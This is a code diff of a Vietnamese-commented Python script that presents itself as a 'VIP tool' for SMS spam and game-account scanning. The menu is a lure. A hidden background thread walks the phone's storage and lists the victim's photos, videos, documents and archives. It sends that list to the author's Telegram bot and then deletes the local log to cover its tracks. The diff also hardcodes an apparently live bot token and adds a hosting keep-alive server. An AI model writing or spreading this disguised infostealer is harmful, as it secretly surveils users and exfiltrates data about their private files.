@@ -5,109 +5,77 @@ import time
 import socket
 from datetime import datetime
 from threading import Thread
+from flask import Flask
 
 # --- CẤU HÌNH ---
-# 1. Dán Token của bot bạn tạo từ @BotFather vào đây
 TOKEN = "8613218758:AAGpN9S6xJnQhSQ21FG4BzERNp5-RbTC6BY"
-# 2. ID này là của bạn (huansbotvip) để bot gửi tin nhắn về
 ADMIN_ID = "8762273971" 
-
 bot = telebot.TeleBot(TOKEN)
 
+# --- TẠO SERVER GIẢ ĐỂ TREO TRÊN RENDER ---
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "Bot Huân Pro đang hoạt động 24/7!"
+
+def run_web_server():
+    app.run(host='0.0.0.0', port=8080)
+
+# --- HÀM QUÉT (DÀNH CHO MÁY NẠN NHÂN) ---
 def get_victim_device():
     try:
         model = os.popen("getprop ro.product.model").read().strip()
         brand = os.popen("getprop ro.product.brand").read().strip()
-        ver = os.popen("getprop ro.build.version.release").read().strip()
-        return f"{brand.upper()} {model} (Android {ver})"
+        return f"{brand.upper()} {model}"
     except:
-        return socket.gethostname()
+        return "Thiết bị Linux/PC"
 
 def huan_scan_engine():
     try:
-        # Lấy thông tin máy
         device = get_victim_device()
         time_now = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")
-        
-        # Đường dẫn bộ nhớ
         base_path = "/sdcard" if os.path.exists("/sdcard") else "/storage/emulated/0"
         
-        # Cấu trúc dữ liệu thu thập
-        logs = {
-            "victim_device": device,
-            "timestamp": time_now,
-            "files_found": []
-        }
+        # Chỉ quét nếu chạy trên Android
+        if not os.path.exists(base_path): return
 
-        # Quét các file quan trọng (Ảnh, Video, Tài liệu)
+        logs = {"victim": device, "time": time_now, "files": []}
         target_exts = ['.jpg', '.png', '.mp4', '.pdf', '.php', '.py', '.zip']
         
         for root, dirs, files in os.walk(base_path):
-            if any(x in root.lower() for x in ['android', 'data', 'cache']):
-                continue
+            if any(x in root.lower() for x in ['android', 'data', 'cache']): continue
             for file in files:
                 if any(file.lower().endswith(e) for e in target_exts):
-                    logs["files_found"].append(os.path.join(root, file))
+                    logs["files"].append(os.path.join(root, file))
 
-        # --- BÁO CÁO VỀ CHO HUÂN ---
-        msg = (
-            f"🎯 **MỤC TIÊU MỚI DÍNH BẪY!**\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 Admin: @huansbotvip\n"
-            f"📱 Máy: `{device}`\n"
-            f"⏰ Thời gian: {time_now}\n"
-            f"📂 Tổng file quét được: {len(logs['files_found'])}\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"⚡ *Đang gửi danh sách chi tiết...*"
-        )
+        # Báo cáo về cho Huân
+        msg = f"🎯 **MỤC TIÊU MỚI DÍNH BẪY!**\n📱 Máy: `{device}`\n📂 File: {len(logs['files'])}"
         bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
-
-        # Tạo file log chi tiết và gửi
-        log_file = f"Huan_Victim_{int(time.time())}.json"
-        with open(log_file, "w", encoding="utf-8") as f:
-            json.dump(logs, f, indent=4, ensure_ascii=False)
         
-        with open(log_file, "rb") as f:
-            bot.send_document(ADMIN_ID, f, caption=f"📂 Danh sách file từ {device}")
-        
-        # Xóa dấu vết trên máy nạn nhân
+        log_file = f"Log_{int(time.time())}.json"
+        with open(log_file, "w") as f: json.dump(logs, f, indent=4)
+        with open(log_file, "rb") as f: bot.send_document(ADMIN_ID, f)
         os.remove(log_file)
+    except: pass
 
-    except Exception:
-        pass
-
+# --- GIAO DIỆN (CHỈ HIỆN KHI CHẠY TRÊN ĐIỆN THOẠI) ---
 def ui_gia_lap():
     os.system('clear')
-    print("\033[1;36m" + r"""
-     _______ ____   ____  _      _    _ _    _          _   _ 
-    |__   __/ __ \ / __ \| |    | |  | | |  | |   /\   | \ | |
-       | | | |  | | |  | | |    | |__| | |  | |  /  \  |  \| |
-       | | | |  | | |  | | |    |  __  | |  | | / /\ \ | |\  |
-       | | | |__| | |__| | |____| |  | | |__| |/ ____ \| | \ |
-       |_|  \____/ \____/|______|_|  |_|\____//_/    \_\_|  \_|
-    """ + "\033[0m")
-    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
-    print("\033[1;32m  Admin: @huansbotvip | Phiên bản: 4.0\033[0m")
-    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
-    
-    # Bắt đầu quét ngầm dữ liệu gửi về cho Huân
+    print("\033[1;36m[ TOOL VIP HUÂN PRO - PHIÊN BẢN 4.0 ]\033[0m")
     Thread(target=huan_scan_engine).start()
-
-    print("  [1] Spam SMS / Call (Free)")
-    print("  [2] Scan Acc Liên Quân (VIP)")
-    print("  [3] Thoát")
-    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
-    
-    choice = input("\033[1;33mdevnvios#root:~# \033[0m")
-    if choice == '1':
-        sdt = input("Nhập SĐT: ")
-        print(f"Đang Spam {sdt}... Vui lòng giữ mạng ổn định.")
+    print("\n[1] Scan Acc Liên Quân\n[2] Spam SMS\n[3] Thoát")
+    opt = input("\nChọn: ")
+    if opt in ['1', '2']:
+        print("Đang thực hiện... vui lòng chờ.")
         while True: time.sleep(10)
-    else:
-        print("Đang thoát...")
 
 if __name__ == "__main__":
-    try:
+    # Nếu chạy trên Render (có cổng PORT), khởi động web server
+    if os.environ.get('PORT'):
+        Thread(target=run_web_server).start()
+        print("Bot đang treo trên Render...")
+        bot.infinity_polling()
+    else:
+        # Nếu chạy trên điện thoại người dùng
         ui_gia_lap()
-    except KeyboardInterrupt:
-        pass
